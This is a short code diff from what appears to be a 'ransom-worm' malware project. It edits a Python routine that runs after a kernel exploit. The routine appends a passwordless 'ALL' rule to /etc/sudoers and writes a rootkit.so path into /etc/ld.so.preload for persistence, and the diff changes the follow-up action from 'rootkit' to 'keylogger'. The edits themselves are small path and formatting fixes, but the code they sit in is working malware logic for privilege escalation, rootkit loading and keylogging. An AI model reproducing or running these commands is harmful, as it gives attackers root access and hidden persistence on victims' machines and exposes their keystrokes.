@@ -94,9 +94,10 @@ def run_exploit(exploit):
             run_command(
                 process, 'echo "user ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers \n'
             )
-            run_command(process, f"touch /etc/ld.so.preload \n")
+            run_command(process, "touch /etc/ld.so.preload \n")
             run_command(
-                process, "echo '/home/$USER/utils/rootkit.so' >/etc/ld.so.preload \n"
+                process,
+                "echo '/home/user/ransom-worm/utils/rootkit.so' >/etc/ld.so.preload \n",
             )
             run_command(process, 'echo "exit" \n')
 
@@ -120,9 +121,10 @@ def run_exploit(exploit):
             run_command(
                 process, 'echo "user ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers \n'
             )
-            run_command(process, f"touch /etc/ld.so.preload \n")
+            run_command(process, "touch /etc/ld.so.preload \n")
             run_command(
-                process, "echo '/home/$USER/utils/rootkit.so' >/etc/ld.so.preload \n"
+                process,
+                "echo '/home/user/ransom-worm/utils/rootkit.so' >/etc/ld.so.preload \n",
             )
             run_command(process, 'echo "exit" \n')
 
@@ -185,7 +187,7 @@ def run():
         # - kernel version
         if exploit_kernel():
             print("kernel exploited")
-            next_action = "rootkit"
+            next_action = "keylogger"
         else:
             print("no kernel exploit available")
             # test something else
